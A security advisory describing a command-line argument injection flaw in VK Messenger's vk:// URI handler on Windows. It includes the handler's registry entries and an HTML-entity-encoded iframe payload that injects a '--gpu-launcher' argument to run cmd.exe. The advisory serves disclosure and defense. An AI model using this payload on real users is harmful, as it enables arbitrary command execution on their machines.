**Vulnerability Summary**<br>
The following describes a vulnerability in VK Messenger that is triggered via the exploitation of improperly handled URI.
VK (VKontakte; [..], meaning InContact) is “an online social media and social networking service. It is available in several languages. VK allows users to message each other publicly or privately, to create groups, public pages and events, share and tag images, audio and video, and to play browser-based games. It is based in Saint Petersburg, Russia”.

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected Version**<br>
VK Messenger version 3.1.0.143

**Vendor Response**<br>
The vendor responded that the problem no longer affects the latest version – but didn’t provide any information on when it was fixed and whether it was fixed due to someone else reporting this vulnerability.

**Vulnerability Details**<br>
The VK Messenger, which is part of the VK package, registers a uri handler on Windows in the following way:

```
[HKEY_CLASSES_ROOT\vk]
"URL Protocol"=""
@="URL:vk"
[HKEY_CLASSES_ROOT\vk\shell]
[HKEY_CLASSES_ROOT\vk\shell\open]
[HKEY_CLASSES_ROOT\vk\shell\open\command]
@="\"C:\\Program Files\\VK\\vk.exe\" \"%1\""
```

When the browser processes the `vk://` uri handler it is possible to inject arbitrary command line parameters for vk.exe, since the application does not properly parse them. It is possible to inject the ‘–gpu-launcher=’ parameter to execute arbitrary commands. It is also possible to inject the ‘–browser-subprocess-path=’ parameter to execute arbitrary commands. Network share paths are allowed, too.<br>
Example of attack encoded in HTML entity:
`<iframe src='vk:?"&#32;&#45;&#45;&#103;&#112;&#117;&#45;&#108;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#61;&#34;&#99;&#109;&#100;&#46;&#101;&#120;&#101;&#32;&#47;&#99;&#32;&#115;&#116;&#97;&#114;&#116;&#32;&#99;&#97;&#108;&#99;&#34;&#32;&#45;&#45;'></iframe>`

When opening a malicious page, a notification box asks the user to open VK.
NOTE: The application is not in the auto-startup items, and the issue will work if the application is not already started.
